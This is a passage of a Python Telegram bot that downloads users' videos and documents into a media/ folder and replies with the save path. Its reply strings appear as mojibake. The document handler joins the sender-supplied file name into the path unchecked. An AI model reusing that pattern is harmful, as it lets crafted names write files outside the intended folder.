        file_name = 'media/' + message.json['video']['file_id']
        file_info = bot.get_file(message.video.file_id)
        with open(file_name, "wb") as f:
            file_content = bot.download_file(file_info.file_path)
            f.write(file_content)
        video = func_api.ren(file_name[5:], "vid")
        bot.reply_to(message, f"OK. –°–æ—Ö—Ä–∞–Ω–∏–ª –∫–∞–∫ {video} –ø–æ –ø—É—Ç–∏ {file_name}")


@bot.message_handler(content_types=['document'])
def handle_file(message):
    if message.chat.id in id:
        try:
            file_info = bot.get_file(message.document.file_id)
            downloaded_file = bot.download_file(file_info.file_path)
            src = 'media/' + message.document.file_name
            with open(src, 'wb') as new_file:
                new_file.write(downloaded_file)
            bot.reply_to(message, f"–§–∞–π–ª —É—Å–ø–µ—à–Ω–æ —Å–∫–∞—á–∞–Ω –∏ —Å–æ—Ö—Ä–∞–Ω–µ–Ω –ø–æ –ø—É—Ç–∏ {src}")
        except Exception as e:
            bot.reply_to(message, f"–û—à–∏–±–∫–∞: {e}")


bot.infinity_polling()
